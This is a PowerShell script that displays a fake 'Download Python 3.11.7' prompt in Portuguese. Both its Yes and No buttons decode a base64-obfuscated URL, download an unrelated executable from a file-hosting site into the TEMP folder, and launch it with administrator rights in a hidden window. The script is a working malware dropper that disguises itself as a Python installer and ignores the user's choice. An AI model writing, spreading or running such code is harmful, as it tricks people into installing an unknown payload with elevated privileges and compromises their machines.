Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms

$f = New-Object Windows.Forms.Form
$f.Text = "Download Python"
$f.Size = New-Object Drawing.Size(400,150)
$f.StartPosition = "CenterScreen"

$l = New-Object Windows.Forms.Label
$l.Location = New-Object Drawing.Point(10,30)
$l.Size = New-Object Drawing.Size(380,40)
$l.Text = "Deseja baixar Python 3.11.7?"
$f.Controls.Add($l)

$y = New-Object Windows.Forms.Button
$y.Location = New-Object Drawing.Point(50,80)
$y.Size = New-Object Drawing.Size(75,23)
$y.Text = "Sim"
$y.Add_Click({
    $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly93d3cudXBsb2FkLmVlL2Rvd25sb2FkLzE2NTQ3NzAwL2ZiMmE4ZjBhZDQxMzFlYWMxZjFkL0FsYmFuYWdfZ25wLmV4ZQ=="))
    $n = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxiYW5pYV9nbnAuZXhl"))
    $c = "$env:TEMP\$n"
    Invoke-WebRequest -Uri $u -OutFile $c
    Start-Process -FilePath $c -Verb RunAs -WindowStyle Hidden
    $f.Close()
})
$f.Controls.Add($y)

$n = New-Object Windows.Forms.Button
$n.Location = New-Object Drawing.Point(200,80)
$n.Size = New-Object Drawing.Size(75,23)
$n.Text = "NÃ£o"
$n.Add_Click({
    $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly93d3cudXBsb2FkLmVlL2Rvd25sb2FkLzE2NTQ3NzAwL2ZiMmE4ZjBhZDQxMzFlYWMxZjFkL0FsYmFuYWdfZ25wLmV4ZQ=="))
    $n = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxiYW5pYV9nbnAuZXhl"))
    $c = "$env:TEMP\$n"
    Invoke-WebRequest -Uri $u -OutFile $c
    Start-Process -FilePath $c -Verb RunAs -WindowStyle Hidden
    $f.Close()
})
$f.Controls.Add($n)

$f.ShowDialog() | Out-Null
